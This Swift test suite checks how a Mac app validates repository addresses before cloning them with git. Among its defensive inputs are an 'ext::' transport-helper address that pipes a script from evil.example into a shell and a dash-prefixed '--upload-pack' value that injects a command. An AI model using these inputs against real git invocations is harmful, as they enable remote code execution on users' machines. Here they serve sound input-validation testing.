import Testing
@testable import Core

@Suite("Reading the address of a repository to clone")
struct CloneTargetTests {
    private let location = "/Users/someone/Projects"
    private let home = "/Users/someone"

    private func verdict(_ remote: String, occupied: Bool = false) -> CloneVerdict {
        CloneVerdict.of(remote: remote, into: location, home: home, isFree: { _ in !occupied })
    }

    @Test("an https address lands in a folder named after the repository")
    func httpsAddress() {
        let target = verdict("https://github.com/akira-foundation/unified-dev-swift.git").target

        #expect(target?.name == "unified-dev-swift")
        #expect(target?.destination == "/Users/someone/Projects/unified-dev-swift")
    }

    @Test("the .git suffix is optional, and a trailing slash does not become the name")
    func suffixAndTrailingSlash() {
        #expect(CloneAddress.name(of: "https://github.com/owner/harbour") == "harbour")
        #expect(CloneAddress.name(of: "https://github.com/owner/harbour.git") == "harbour")
        #expect(CloneAddress.name(of: "https://github.com/owner/harbour/") == "harbour")
        #expect(CloneAddress.name(of: "https://github.com/owner/harbour.git/") == "harbour")
    }

    @Test("an scp style ssh address is read, which is what GitHub offers by default")
    func scpAddress() {
        let target = verdict("git@github.com:owner/beacon.git").target

        #expect(target?.name == "beacon")
        #expect(target?.destination == "/Users/someone/Projects/beacon")
    }

    @Test("an ssh url, a file url and a path on this Mac are all cloneable")
    func sshAndLocal() {
        #expect(verdict("ssh://git@github.com/owner/beacon.git").isAllowed)
        #expect(verdict("/Volumes/backup/beacon.git").isAllowed)
        #expect(verdict("file:///Volumes/backup/beacon.git").isAllowed)
    }

    @Test("a tilde is expanded, so a local address is not handed to git as git reads it literally")
    func expandsTheTilde() {
        let target = verdict("~/code/mirror.git").target

        #expect(target?.remote == "/Users/someone/code/mirror.git")
        #expect(target?.name == "mirror")
    }

    @Test("plain http and git addresses are refused, because neither proves which server answered")
    func refusesUnauthenticatedTransports() {
        #expect(verdict("http://mirror.example/team/app.git") == .refuse(
            .unsupported("http://mirror.example/team/app.git")
        ))
        #expect(verdict("git://mirror.example/team/app.git") == .refuse(
            .unsupported("git://mirror.example/team/app.git")
        ))
        #expect(!CloneAddress.safeSchemes.contains("http"))
        #expect(!CloneAddress.safeSchemes.contains("git"))
    }

    @Test("a scheme outside the allow-list is refused rather than handed to git")
    func refusesAnyOtherScheme() {
        #expect(verdict("ftp://host/owner/repo.git") == .refuse(
            .unsupported("ftp://host/owner/repo.git")
        ))
        #expect(verdict("telnet://host/owner/repo.git").isAllowed == false)
        #expect(!CloneAddress.isSupported("ftp://host/owner/repo.git"))
        #expect(CloneAddress.isSupported("https://host/owner/repo.git"))
    }

    @Test("an empty address is waiting for the owner to paste, not a refusal to read")
    func emptyIsWaiting() {
        #expect(verdict("") == .refuse(.empty))
        #expect(verdict("   ") == .refuse(.empty))
        #expect(ProjectConsequence.cloning(verdict(""), home: home).tone == .waiting)
    }

    @Test("a transport helper is refused, because it tells git to run a command of its own")
    func refusesTransportHelper() {
        #expect(verdict("ext::sh -c 'curl evil.example | sh'") == .refuse(.unsafeTransport("ext")))
        #expect(verdict("ext::whoami") == .refuse(.unsafeTransport("ext")))
        #expect(CloneAddress.transportHelper(in: "ext::whoami") == "ext")
    }

    @Test("an scp address holding an IPv6 literal is not mistaken for a transport helper")
    func readsAnIPv6Literal() {
        #expect(CloneAddress.transportHelper(in: "git@[::1]:owner/repo.git") == nil)
        #expect(CloneAddress.transportHelper(in: "ssh://git@[::1]:22/owner/repo.git") == nil)
    }

    @Test("an address beginning with a dash is refused, so it can never arrive as a flag")
    func refusesFlagShapedAddress() {
        #expect(verdict("--upload-pack=touch /tmp/pwned") == .refuse(
            .unsupported("--upload-pack=touch /tmp/pwned")
        ))
    }

    @Test("an address carrying a password is refused, because git writes it into .git/config")
    func refusesAnEmbeddedPassword() {
        #expect(verdict("https://kid:ghp_secret@github.com/org/repo.git") == .refuse(
            .embeddedPassword
        ))
        #expect(CloneAddress.embeddedPassword(in: "https://kid:x@host/o/r.git"))
    }

    @Test("a plain user in the address is not a password, so ssh as a user still clones")
    func allowsAUserWithoutAPassword() {
        #expect(!CloneAddress.embeddedPassword(in: "ssh://git@github.com/owner/repo.git"))
        #expect(verdict("ssh://git@github.com/owner/repo.git").isAllowed)
    }

    @Test("the address of a page on the site is refused, rather than cloned into a folder named main")
    func refusesABrowserAddress() {
        #expect(verdict("https://github.com/owner/repo/tree/main") == .refuse(
            .browserAddress("tree")
        ))
        #expect(verdict("https://github.com/owner/repo/pull/191") == .refuse(
            .browserAddress("pull")
        ))
        #expect(verdict("https://github.com/owner/repo/blob/main/README.md") == .refuse(
            .browserAddress("blob")
        ))
    }

    @Test("a query and a fragment are not part of the repository name")
    func stripsQueryAndFragment() {
        #expect(CloneAddress.name(of: "https://github.com/owner/repo.git?tab=readme") == "repo")
        #expect(CloneAddress.name(of: "https://github.com/owner/repo#readme") == "repo")
    }

    @Test("a nested group path still reads the repository as the last component")
    func readsANestedGroup() {
        #expect(CloneAddress.name(of: "https://gitlab.com/group/sub/harbour.git") == "harbour")
        #expect(verdict("https://gitlab.com/group/sub/harbour.git").isAllowed)
    }

    @Test("something that is not an address at all is refused rather than handed to git")
    func refusesNonAddress() {
        #expect(verdict("unified-dev-swift") == .refuse(.unsupported("unified-dev-swift")))
        #expect(verdict("github.com") == .refuse(.unsupported("github.com")))
    }

    @Test("a colon alone does not make an scp address, so neither a path nor a bare host is cloneable")
    func refusesAColonThatNamesNoHostAndNoRepository() {
        #expect(!CloneAddress.isSupported("docs/notes:2"))
        #expect(!CloneAddress.isSupported("github.com:"))
        #expect(verdict("docs/notes:2") == .refuse(.unsupported("docs/notes:2")))
        #expect(verdict("github.com:") == .refuse(.unsupported("github.com:")))
    }

    @Test("an address naming no repository is refused, because there is no folder to make")
    func refusesWithoutAName() {
        #expect(verdict("https://github.com/") == .refuse(.noName("https://github.com/")))
        #expect(CloneAddress.name(of: "https://github.com/owner/.git") == nil)
        #expect(CloneAddress.name(of: "https://github.com/owner/..") == nil)
    }

    @Test("a destination with something already in it is refused before git is run")
    func refusesOccupiedDestination() {
        let refused = verdict("https://github.com/owner/harbour.git", occupied: true)

        #expect(refused == .refuse(.occupied("/Users/someone/Projects/harbour")))
        #expect(!refused.isAllowed)
    }

    @Test("the consequence says where it lands before anything is cloned")
    func consequenceNamesTheDestination() {
        let allowed = verdict("https://github.com/owner/harbour.git")
        let said = ProjectConsequence.cloning(allowed, home: home)

        #expect(said.tone == .going)
        #expect(said.lead == "~/Projects/harbour is where it lands.")
    }

    @Test("a refusal is shown as a refusal, with the sentence that says why")
    func refusalCarriesItsSentence() {
        let said = ProjectConsequence.cloning(verdict("github.com"), home: home)

        #expect(said.tone == .refusal)
        #expect(said.detail == CloneRefusal.unsupported("github.com").sentence)
    }
}
